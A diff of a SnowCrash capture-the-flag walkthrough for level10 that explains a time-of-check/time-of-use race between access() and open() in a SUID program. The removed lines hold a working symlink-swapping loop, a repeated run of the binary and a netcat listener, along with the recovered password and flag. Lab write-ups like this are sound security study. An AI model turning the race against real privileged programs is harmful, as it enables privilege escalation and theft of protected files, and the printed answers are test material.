@@ -1,42 +1,3 @@
-in the level10 when we ran ls we got level10 token
-
-if we do ./level10 wegot means level10 accepts a file and host
-
-we try ./level10 token localhost but we got You don't have access to token
-
-if we tried to decompile the level10 we will se that this program uses the access function to check the permission of the file , but there is an vulnabitlty here :
-from access man :
-Warning: Using these calls to check if a user is authorized to,
-for example, open a file before actually doing so using open(2)
-creates a security hole, because the user might exploit the short
-time interval between checking and opening the file to manipulate
-it. For this reason, the use of this system call should be
-avoided. (In the example just described, a safer alternative
-would be to temporarily switch the process's effective user ID to
-the real ID and then call open(2).)
-
-so wa can exploit the time gap (TOCTOU) between the check permission and open the file .
-
-we perpare a script , and run it in terminal
-echo "test" > /tmp/fake &
-while true; do
-ln -sf /tmp/fake /tmp/exploit;
-ln -sf ~/token /tmp/exploit;
-done &
-
-then we run :
-while true; do
-./level10 /tmp/exploit 127.0.0.1;
-done
-
-and Since level10 sends the file over the network, we will need a listener:
-
-nc -lk 6969
-then we will get the password:
-woupa2yuojeeaaed06riuj63c
-
-then we run su flag10 and type the password woupa2yuojeeaaed06riuj63c then we run the getflag command and we will get the flag: feulo4b72j7edeahuete3no7c
-
 # SnowCrash Level10 Walkthrough
 
 ## Overview
@@ -114,6 +75,7 @@ From the access man page warning:
 ## TOCTOU Exploit Concept
 
 We can exploit the time gap between:
+
 1. access() checking permissions (as the current user)
 2. open() reading the file (as flag10, due to SUID)
 
